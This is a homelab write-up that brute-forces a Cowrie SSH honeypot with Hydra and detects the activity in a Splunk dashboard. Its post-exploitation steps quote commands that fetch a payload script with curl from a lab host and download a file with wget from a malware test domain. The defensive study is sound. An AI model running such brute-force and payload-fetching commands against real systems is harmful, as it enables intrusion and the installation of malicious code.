# Brute Force Attack on Cowrie Honeypot

## Attack — Hydra SSH Brute Force

Launched a Hydra brute force attack from the Kali VM (192.168.1.194) against the Cowrie honeypot (192.168.1.150) on port 2222 using the `rockyou.txt` wordlist. Hydra found 3 valid passwords (`123456789`, `12345`, `password`) — these are fake credentials that Cowrie deliberately accepts to lure attackers into a simulated shell.

After gaining access, we SSH'd into the honeypot as `root` and ran post-exploitation commands to simulate real attacker behavior: `whoami`, `curl` to fetch a payload script, `wget` to download a file from a known malware test domain, and `ls` to inspect the filesystem. Cowrie silently logged every command.

![Hydra brute force attack and post-exploitation commands](screenshots/brute-force/01-hydra-attack.png)

## Detection — Splunk Dashboard

The Cowrie Honeypot Attack Dashboard on Splunk (192.168.1.111) shows the attack in real time. The "Failed Login Attempts Over Time" chart picked up the brute force spike, while "Successful Fake Logins Over Time" shows the 5 sessions where Cowrie let the attacker in. The Attack Session Deep Dive table logs every command executed inside the honeypot — `ls`, `wget http://malware.testcategory.com/test`, `curl http://192.168.1.150:8000/payload.sh`, and `whoami` — all tied to session ID `fa85b2d3100f`.

![Splunk Cowrie Honeypot Attack Dashboard](screenshots/brute-force/02-splunk-dashboard.png)

## Attacker Profile Summary

Splunk's Attacker Profile Summary aggregates all activity from the attacker IP (192.168.1.194). In this session: 2 failed logins, 5 successful (fake) logins, 13 commands executed, 0 download attempts flagged, targeting the `root` username. The full command list shows reconnaissance (`whoami`, `ls`), data exfil attempts (`curl`, `wget` to a malware test domain), and session cleanup (`clear`, `exit`). Threat score: 117. First seen 04:33:20, last seen 04:41:46.

![Attacker Profile Summary in Splunk](screenshots/brute-force/03-attacker-profile.png)
